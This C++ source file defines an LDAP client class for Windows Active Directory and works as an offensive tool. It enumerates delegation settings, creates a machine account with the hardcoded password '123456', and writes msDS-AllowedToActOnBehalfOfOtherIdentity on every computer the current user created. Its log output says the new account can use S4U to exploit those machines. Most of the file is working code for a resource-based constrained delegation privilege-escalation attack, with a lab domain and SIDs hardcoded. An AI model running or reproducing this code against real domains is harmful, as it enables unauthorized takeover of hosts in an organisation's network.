#include "m_ldap_api.h"
#define DEBUG 1
LDAP_API::LDAP_API(string username, string password, string ldapServerAddr, string domainName)
{
	this->pLdapInstance = NULL;
	this->pLdapMessage = NULL;
	this->pEntry = NULL;
	this->ldapServerAddr = ldapServerAddr;
	this->domainName = domainName;
	this->username = username;
	this->password = password;
	this->defaultTimeVal.tv_sec = 1;
	this->init();
	this->initBaseDn();
}
 
LDAP_API::LDAP_API(string ldapServerAddr, string domainName)
{
	this->pLdapInstance = NULL;
	this->pLdapMessage = NULL;
	this->pEntry = NULL;
	this->ldapServerAddr = ldapServerAddr;
	this->domainName = domainName;
	this->defaultTimeVal.tv_sec = 1;
	this->init();
}


LDAP_API::~LDAP_API()
{
	this->closeLdapConnection();
}

void LDAP_API::closeLdapConnection(){
	if (this->pLdapMessage != NULL){
		ldap_msgfree(this->pLdapMessage);
		this->pLdapMessage = NULL;
	}
	if (this->pLdapInstance != NULL){
		ldap_unbind_s(this->pLdapInstance);
		this->pLdapInstance = NULL;
	}
}


void LDAP_API::init(){
	this->initBaseDn();
	this->pLdapInstance = ldap_init((PSTR)this->ldapServerAddr.c_str(), LDAP_PORT);
	if (this->setLdapOption() == LDAP_SUCCESS){
		if (this->connect() == LDAP_SUCCESS){
			if (this->bind() == LDAP_SUCCESS){
				cout << "[+] LDAP::init Successed" << endl;
			}
		}
	}
}

void LDAP_API::initBaseDn(){
	vector<string> vString = split(this->domainName, ".");
	this->baseDn = "DC=" + vString[0] + ",DC=" + vString[1];
}


SEC_WINNT_AUTH_IDENTITY_W LDAP_API::initLdapCreds(){
	SEC_WINNT_AUTH_IDENTITY_W secAuthIdentity;
	
	secAuthIdentity.Domain = (USHORT*)this->ldapServerAddr.c_str();
	secAuthIdentity.DomainLength = lstrlen(this->ldapServerAddr.c_str());
	
	secAuthIdentity.User = (USHORT*)this->username.c_str();
	secAuthIdentity.UserLength = lstrlen(this->username.c_str());
	
	secAuthIdentity.Password = (USHORT*)this->password.c_str();
	secAuthIdentity.PasswordLength = lstrlen(this->password.c_str());

	secAuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
	return secAuthIdentity;
}
 
DWORD LDAP_API::setLdapOption(){
	DWORD dwRet;

	dwRet = ldap_set_option(this->pLdapInstance, LDAP_OPT_PROTOCOL_VERSION, (void*)LDAP_VERSION3);
	if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
		cout << "[+] LDAP::setLdapOption LDAP_OPT_PROTOCOL_VERSION Successed" << endl;
#else
#endif
		dwRet = ldap_set_option(this->pLdapInstance, LDAP_OPT_ENCRYPT, LDAP_OPT_ON);
		if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
			cout << "[+] LDAP::setLdapOption LDAP_OPT_ENCRYPT Successed" << endl;
#else
#endif
			dwRet = ldap_set_option(this->pLdapInstance, LDAP_OPT_SIGN, LDAP_OPT_ON);
			if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
				cout << "[+] LDAP::setLdapOption LDAP_OPT_SIGN Successed" << endl;
#else
#endif
				return LDAP_SUCCESS;
			}
			else{
				cout << "[-] LDAP::setLdapOption Failed" << endl;
				return LDAP_OPERATIONS_ERROR;
			}
		}
		else{
			cout << "[-] LDAP::setLdapOption Failed" << endl;
			return LDAP_OPERATIONS_ERROR;
		}
	}
	else{
		cout << "[-] LDAP::setLdapOption Failed" << endl;
		return LDAP_OPERATIONS_ERROR;
	}
}

DWORD LDAP_API::connect(){
	DWORD dwRet = ldap_connect(this->pLdapInstance, &defaultTimeVal);
	if (dwRet == LDAP_SUCCESS){
#ifdef DEBUG
		cout << "[+] LDAP::connect Successed" << endl;
#else
#endif
		return LDAP_SUCCESS;
	}
	else{
		cout << "[-] LDAP::connect Failed" << endl;
		this->closeLdapConnection();
		return LDAP_OPERATIONS_ERROR;
	}
}

DWORD LDAP_API::bind(){
	DWORD dwRet;
	if (!this->password.empty()){
		SEC_WINNT_AUTH_IDENTITY_W secAuthIdentity = this->initLdapCreds();
		dwRet = ldap_bind_s(this->pLdapInstance, (PSTR)this->baseDn.c_str(), (PCHAR)&secAuthIdentity, LDAP_AUTH_NEGOTIATE);
		if (dwRet != -1){
#ifdef DEBUG
			cout << "[+] LDAP::bind Successed" << endl;
#else
#endif
			return LDAP_SUCCESS;
		}
		else{
			cout << "[-] LDAP::bind Failed" << endl;
			this->closeLdapConnection();
			return LDAP_OPERATIONS_ERROR;
		}
	}
	else{
		dwRet = ldap_bind_s(this->pLdapInstance, NULL, NULL, LDAP_AUTH_NEGOTIATE);
		if (dwRet != -1){
#ifdef DEBUG
			cout << "[+] LDAP::bind - default current user Successed" << endl;
#else
#endif
			return LDAP_SUCCESS;
		}
		else{
			cout << "[-] LDAP::bind Failed" << endl;
			this->closeLdapConnection();
			return LDAP_OPERATIONS_ERROR;
		}
	}
}

/*大部分都参考了ske大师兄的，因为写的比较完全了，比如基于资源的约束委派方面上相关的SID获取用户名其实都写了*/
vector<string> LDAP_API::search(string filterGrammar, string dn, PCHAR searchAttabuite[]){
	vector<string> vString;
	DWORD dwRet = ldap_search_s(this->pLdapInstance, (PSTR)dn.c_str(), LDAP_SCOPE_SUBTREE, (PSTR)filterGrammar.c_str(),
		(PZPSTR)searchAttabuite, 0, &this->pLdapMessage);
	if (dwRet == LDAP_SUCCESS){
		DWORD numberOfEntries = ldap_count_entries(
			this->pLdapInstance,    // Session handle
			this->pLdapMessage);     // Search result

		if (numberOfEntries != NULL)
		{
			//----------------------------------------------------------
			// Loop through the search entries, get, and output the
			// requested list of attributes and values.
			//----------------------------------------------------------
			LDAPMessage* pEntry = NULL;
			PCHAR pEntryDN = NULL;
			ULONG iCnt = 0;
			BerElement* pBer = NULL;
			PCHAR pAttribute = NULL;
			PCHAR* ppValue = NULL;
			ULONG iValue = 0;
			
			for (iCnt = 0; iCnt < numberOfEntries; iCnt++)
			{
				// Get the first/next entry.
				if (!iCnt)
					pEntry = ldap_first_entry(this->pLdapInstance, this->pLdapMessage);
				else
					pEntry = ldap_next_entry(this->pLdapInstance, pEntry);
				
				if (pEntry != NULL){
					// Get the first attribute name.
					pAttribute = ldap_first_attribute(this->pLdapInstance, pEntry, &pBer);
					while (pAttribute != NULL){
						// 这种情况就是如果ppValue是sid的时候，需要手动进行转换成用户下，否则输出是未知数据
						if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "mS-DS-CreatorSID", lstrlen("mS-DS-CreatorSID")) == 2){
							LDAP_BERVAL** berVal;
							string domainUser;
							PSID pSid;
							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
								for (int i = 0; berVal[i]; i++)
								{
									string sid = ConvertToStringSid((const unsigned char*)berVal[i]->bv_val, berVal[i]->bv_len);
									ConvertStringSidToSid(sid.c_str(), &pSid);
									domainUser = sid2user(pSid, this->ldapServerAddr.c_str());
									cout << "\t" << pAttribute << "=" << sid << " ----> " << domainUser;
								}
								ldap_value_free_len(berVal);
							}
						}
						else if (CompareString(GetThreadLocale(), NORM_IGNORECASE, pAttribute, lstrlen(pAttribute), "objectSid", lstrlen("objectSid")) == 2){
							LDAP_BERVAL** berVal;
							if (berVal = ldap_get_values_len(this->pLdapInstance, pEntry, pAttribute)){
								for (int i = 0; berVal[i]; i++)
								{
									string sid = ConvertToStringSid((const unsigned char*)berVal[i]->bv_val, berVal[i]->bv_len);
									vString.push_back(sid);
								}
								ldap_value_free_len(berVal);
							}
						}
						else{
							// get common attribute
							ppValue = ldap_get_values(this->pLdapInstance, pEntry, pAttribute);
							cout << "\t" << pAttribute << "=" << *ppValue;
							vString.push_back(*ppValue);
						}
						
						// Free memory.
						if (ppValue != NULL)
							ldap_value_free(ppValue);
						 
						ppValue = NULL;
						ldap_memfree(pAttribute);

						// Get next attribute name.
						pAttribute = ldap_next_attribute(
							this->pLdapInstance,   // Session Handle
							pEntry,            // Current entry
							pBer);             // Current BerElement
					}
				}
				else{
					this->closeLdapConnection();
				}
			}
			cout << endl;
		}else{
			cout << "[-] LDAP::ldap_count_entries Failed" << endl;
			this->closeLdapConnection();
		}
	}
	else{
		cout << "[-] LDAP::ldap_search_s Failed, The Error is " << dwRet << endl;
		this->closeLdapConnection();
		// exit(-1);
	}
	return vString;
	
}

void LDAP_API::searchConstrainedDelegation(){
	PCHAR pAttributes[] = {"msds-allowedtodelegateto", "cn", NULL };
	this->search("(&(samAccountType=805306368)(msds-allowedtodelegateto=*))", this->baseDn, pAttributes);
}

void LDAP_API::searchUnconstrainedDelegation(){
	PCHAR pAttributes[] = {"userAccountControl", "cn", NULL };
	this->search("(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))", this->baseDn, pAttributes);
}

void LDAP_API::searchResourceBasedConstrainedDelegation(){
	PCHAR pAttributes[] = {"mS-DS-CreatorSID", "cn", NULL };
	this->search("(&(ObjectClass=computer)(mS-DS-CreatorSID=*))", this->baseDn, pAttributes);
}

vector<string> LDAP_API::getObjectSid(string pcName){
	PCHAR pAttributes[] = { "objectSid", NULL };
	string distinguishedName = "(sAMAccountName=" + pcName + "$)";
	return this->search(distinguishedName.c_str(), this->baseDn, pAttributes);
}


string LDAP_API::addComputer(string pcName){
	LDAPMod m1, m2, m3, m4, m5, m6;

	string dnsHostNameString = pcName + "." + this->domainName;
	TCHAR* dnsHostNameVals[] = { (TCHAR*)dnsHostNameString.c_str(), NULL };
	m1.mod_op = LDAP_MOD_ADD;
	m1.mod_type = "DnsHostName";
	m1.mod_values = dnsHostNameVals;

	string samAccountNameString = pcName + "$";
	TCHAR* samAccountNameVals[] = { (TCHAR*)samAccountNameString.c_str(), NULL };
	m2.mod_op = LDAP_MOD_ADD;
	m2.mod_type = "SamAccountName";
	m2.mod_values = samAccountNameVals;

	TCHAR* userAccountControlVals[] = { "4096", NULL };
	m3.mod_op = LDAP_MOD_ADD;
	m3.mod_type = "userAccountControl";
	m3.mod_values = userAccountControlVals;
	
	string unicodePwdString = "\"123456\"";
	BerValue bv; 
	bv.bv_val = new char[(unicodePwdString.length()) * 2];
	memset(bv.bv_val, 0, unicodePwdString.length() * 2);
	for (UINT i = 0; i < unicodePwdString.length(); i++) {
		bv.bv_val[i * 2] = unicodePwdString[i];
	}
	bv.bv_len = unicodePwdString.length() * 2;
	BerValue* unicodePwdVals[] = { &bv, NULL };
	m4.mod_op = LDAP_MOD_ADD | LDAP_MOD_BVALUES;
	m4.mod_type = "unicodePwd";
	m4.mod_bvalues = unicodePwdVals;
	
	TCHAR* objectClassVals[] = { "Computer", NULL };
	m5.mod_op = LDAP_MOD_ADD;
	m5.mod_type = "objectClass";
	m5.mod_values = objectClassVals;
	
	TCHAR* servicePrincipalNameVals[] = { 
		"HOST/test222.hengge.com", 
		"RestrictedKrbHost/test222.hengge.com", 
		"HOST/test222",
		"RestrictedKrbHost/test222",	
		NULL 
	};
	m6.mod_op = LDAP_MOD_ADD;
	m6.mod_type = "ServicePrincipalName";
	m6.mod_values = servicePrincipalNameVals;

	LDAPMod* pModAttrs[7] = { &m1, &m2, &m3, &m4, &m5, &m6, NULL };
	//string userSid = this->getCurrentUserSid();
	//MACHINE_ACCOUNT_ATTRIBUTE machineAccountAttribute;
	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, "CN=test222,CN=Computers,DC=hengge,DC=com", pModAttrs, NULL, NULL);
	if (dwRet == LDAP_SUCCESS){
		cout << "[+] LDAP::addComputer Add Successed, Password is 123456" << endl;
		delete bv.bv_val;
		vector<string> vString =  this->getObjectSid("test222");
		return vString[0];
	}else{
		cout << "[-] LDAP::addComputer Add Failed, The Error is " << dwRet << endl;
		delete bv.bv_val;
		return "";
	}
}

void LDAP_API::addDnsRecord(){
	
}


void LDAP_API::updateResourceBasedConstrainedDelegation(){
	wstring addComputerSidString = string2Wstring(addComputer("test222"));
	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
	string currentUserCreatorSid = this->getCurrentUserSid();
	cout << "[+] CurrentCreatorSid ----> "  << currentUserCreatorSid << endl;
	vector<string> vCnString;
	// 找到当前mS-DS-CreatorSID为当前用户的CN
	string fmtCreatorSid = "(mS-DS-CreatorSID=" + currentUserCreatorSid + ")";
	cout << "[+] Checking " << fmtCreatorSid << endl;
	PCHAR pAttributes[] = { "cn", NULL }; 
	vCnString = this->search(fmtCreatorSid, this->baseDn, pAttributes);
	if (!vCnString.empty()){
		// 遍历取出可以基于资源委派的机器名
		// 对所有可以进行资源委派的机器名设置对应的字段msDS-AllowedToActOnBehalfOfOtherIdentity为当前的用户SID
		for (unsigned int i = 0; i<vCnString.size(); i++){
			// 添加msDS-AllowedToActOnBehalfOfOtherIdentity
			// computer dn = "CN=test1,DC=hengge,DC=com,CN=Computers"
			// CN=ttkq,CN=Computers,DC=hengge,DC=com
			// D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4223269421-3390898629-3395902804-1119)
			// O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4223269421-3390898629-3395902804-1119)
			wstring msDSAllowedToActOnBehalfOfOtherIdentityString = L"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + addComputerSidString + L")";
			//SECURITY_ATTRIBUTES securityAttr;
			//securityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			//securityAttr.bInheritHandle = FALSE;
			//ConvertStringSecurityDescriptorToSecurityDescriptor(msDSAllowedToActOnBehalfOfOtherIdentityString.c_str(), SDDL_REVISION_1, &securityAttr.lpSecurityDescriptor, NULL);
			//SECURITY_ATTRIBUTES* msDSAllowedToActOnBehalfOfOtherIdentityVals[] = { &securityAttr, NULL };
			//TCHAR* msDSAllowedToActOnBehalfOfOtherIdentityVals[] = { (PSTR)msDSAllowedToActOnBehalfOfOtherIdentityString.c_str(), NULL };
			
			IDirectoryObject* pDirObject = NULL;
			HRESULT hr;
			wstring cnWstring = string2Wstring(vCnString[i]);
			wstring computerDn = L"LDAP://CN=" + cnWstring + L",CN=Computers,DC=hengge,DC=com";
			//wstring computerDn = L"LDAP://CN=test1,CN=Computers,DC=hengge,DC=com";
			wcout << L"[+] " << computerDn << endl;
			CoInitialize(NULL);
			hr = ADsOpenObject(computerDn.c_str(),
				NULL,
				NULL,
				ADS_SECURE_AUTHENTICATION,
				IID_IDirectoryObject,
				(void**)&pDirObject);
			
			if (SUCCEEDED(hr)){
				DWORD dwSaLength;
				PSECURITY_ATTRIBUTES pSa = new SECURITY_ATTRIBUTES();
				pSa->nLength = sizeof(SECURITY_ATTRIBUTES);
				pSa->bInheritHandle = FALSE;
				ConvertStringSecurityDescriptorToSecurityDescriptorW(msDSAllowedToActOnBehalfOfOtherIdentityString.c_str(), SDDL_REVISION_1, &(pSa->lpSecurityDescriptor), &dwSaLength);
				
				ADS_NT_SECURITY_DESCRIPTOR ntSecurtyDesc;
				ntSecurtyDesc.lpValue = (LPBYTE)pSa->lpSecurityDescriptor;
				ntSecurtyDesc.dwLength = dwSaLength;
				
				ADSVALUE attrValue;
				attrValue.dwType = ADSTYPE_NT_SECURITY_DESCRIPTOR;
				attrValue.SecurityDescriptor = ntSecurtyDesc;
				
				ADS_ATTR_INFO attrInfo[] = { { L"msds-allowedtoactonbehalfofotheridentity", ADS_ATTR_UPDATE,
					ADSTYPE_NT_SECURITY_DESCRIPTOR, &attrValue, 1 } };
				DWORD dwAttrs = sizeof(attrInfo) / sizeof(ADS_ATTR_INFO);
				
				DWORD dwReturn;
				hr = pDirObject->SetObjectAttributes(attrInfo, dwAttrs, &dwReturn);
				
				if (SUCCEEDED(hr)){
					cout << "[+] msDS-AllowedToActOnBehalfOfOtherIdentity Attributes Add Succussed" << endl;
					wcout << "[+] " << addComputerSidString << " Can Via S4u2self To Exploit " << cnWstring << endl;
				}
				else
					cout << "[-] msDS-AllowedToActOnBehalfOfOtherIdentity Attributes Add Failed, The Error is " << LdapGetLastError() << endl;;
				
				// 释放
				pDirObject->Release();
			}
			
		}

		// 清空容器
		vCnString.clear();
		// 释放COM套件
		CoUninitialize();
	}
	else{
		cout << "[-] Current User Sid No Machine Can Exploit" << endl;
	}
}

void LDAP_API::updatePrivilege(){
	// 本地服务账户的权限提升

}